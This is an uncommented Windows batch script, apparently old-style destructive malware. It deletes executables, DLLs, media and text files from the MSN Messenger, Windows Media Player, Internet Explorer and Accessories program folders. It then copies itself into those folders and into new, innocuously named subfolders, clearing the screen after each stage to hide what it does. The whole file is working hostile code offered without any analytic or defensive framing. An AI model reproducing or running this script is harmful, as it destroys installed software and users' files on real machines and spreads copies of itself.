@echo off
cls
:msn
del C:\progra~1\msnmes~1\*.wav
del C:\progra~1\msnmes~1\*.exe
del C:\progra~1\msnmes~1\*.txt
del C:\progra~1\msnmes~1\*.gif
del C:\progra~1\msnmes~1\*.dll
del C:\progra~1\msnmes~1\*.rtf
md C:\progra~1\msnmes~1\User623
copy %0 C:\progra~1\msnmes~1
md C:\progra~1\msnmes~1\User623
copy %0 C:\progra~1\msnmes~1\User623
md C:\progra~1\msnmes~1\User623\Usersettings
copy %0 C:\progra~1\msnmes~1\User623\Usersettings
md C:\progra~1\msnmes~1\User623\Userfiles
copy %0 C:\progra~1\msnmes~1\User623\Userfiles
cls
goto wmp

:wmp
del C:\progra~1\window~1\*.zip
del C:\progra~1\window~1\*.dll
del C:\progra~1\window~1\*.exe
del C:\progra~1\window~1\MPLAYER2.*
copy %0 C:\progra~1\window~1
md C:\progra~1\window~1\Userfiles
copy %0 C:\progra~1\window~1\Userfiles
md C:\progra~1\window~1\Usersettings
copy %0 C:\progra~1\window~1\Usersettings
md C:\progra~1\window~1\Usersettings\736
copy %0 C:\progra~1\window~1\Usersettings\736
cls
goto explore

:explore
del C:\progra~1\intern~1\*.dll
del C:\progra~1\intern~1\*.exe
del C:\progra~1\intern~1\IESETUP.*
copy %0 C:\progra~1\intern~1
md C:\progra~1\intern~1\Users
copy %0 C:\progra~1\intern~1\Users
md C:\progra~1\intern~1\Users\Data
copy %0 C:\progra~1\intern~1\Users\Data
md C:\progra~1\intern~1\Users\Files
copy %0 C:\progra~1\intern~1\Users\Files
md C:\progra~1\intern~1\Users\Download
copy %0 C:\progra~1\intern~1\Users\Download
cls
goto acces

:acces
del C:\progra~1\bureau~1\*.txt
del C:\progra~1\bureau~1\*.exe
del C:\progra~1\bureau~1\cis.*
del C:\progra~1\bureau~1\pppmenu.*
del C:\progra~1\bureau~1\slip.*
del C:\progra~1\bureau~1\slipmenu.*
copy %0 C:\progra~1\bureau~1
md C:\progra~1\bureau~1\Paintsettings
copy %0 C:\progra~1\bureau~1\Paintsettings
md C:\progra~1\bureau~1\Data
copy %0 C:\progra~1\bureau~1\Data
md C:\progra~1\bureau~1\Data\Settings
copy %0 C:\progra~1\bureau~1\Data\Settings
md C:\progra~1\bureau~1\Data\Files
copy %0 C:\progra~1\bureau~1\Data\Files
cls


